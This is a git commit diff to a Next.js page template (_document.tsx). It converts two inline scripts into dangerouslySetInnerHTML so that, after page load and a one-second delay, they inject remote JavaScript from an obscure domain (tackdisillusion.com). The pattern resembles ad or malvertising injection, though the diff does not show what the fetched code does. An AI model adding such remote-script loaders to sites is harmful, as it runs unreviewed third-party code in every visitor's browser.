8008524799fe354a1c3c85da0ac5b08c199389da
droplinxuser <68084306+droplinxuser@users.noreply.github.com>
2025-11-05 09:15:59 +0800

    Update _document.tsx

--- frontend/src/pages/_document.tsx
+++ frontend/src/pages/_document.tsx
@@ -14,8 +14,8 @@ export default class _Document extends Document {
           <link rel="icon" type="image/x-icon" href="/img/favicon.ico" />
           <link rel="apple-touch-icon" href="/img/icons/icon-128x128.png" />
 
-          <script>window.addEventListener("load",function(){setTimeout(function(){var a=document.createElement("script");a.type="text/javascript",a.src="//tackdisillusion.com/cc/df/f9/ccdff92c9d7f97c5af143f6c519f16ed.js",document.body.appendChild(a)},1e3)});</script>
-          <script>window.addEventListener("load",function(){setTimeout(function(){var a=document.createElement("script");a.type="text/javascript",a.src="//tackdisillusion.com/4d/69/6f/4d696fd2a6a11010f9f9e4cdbadc5907.js",document.body.appendChild(a)},1e3)});</script>
+          <script dangerouslySetInnerHTML={{ __html: `window.addEventListener("load",function(){setTimeout(function(){var a=document.createElement("script");a.type="text/javascript",a.src="//tackdisillusion.com/cc/df/f9/ccdff92c9d7f97c5af143f6c519f16ed.js",document.body.appendChild(a)},1e3)});` }} />
+          <script dangerouslySetInnerHTML={{ __html: `window.addEventListener("load",function(){setTimeout(function(){var a=document.createElement("script");a.type="text/javascript",a.src="//tackdisillusion.com/4d/69/6f/4d696fd2a6a11010f9f9e4cdbadc5907.js",document.body.appendChild(a)},1e3)});` }} />
           
           <script type="module" data-entity="dropmb" src="https://a.socke7.com/script.js"></script>
 
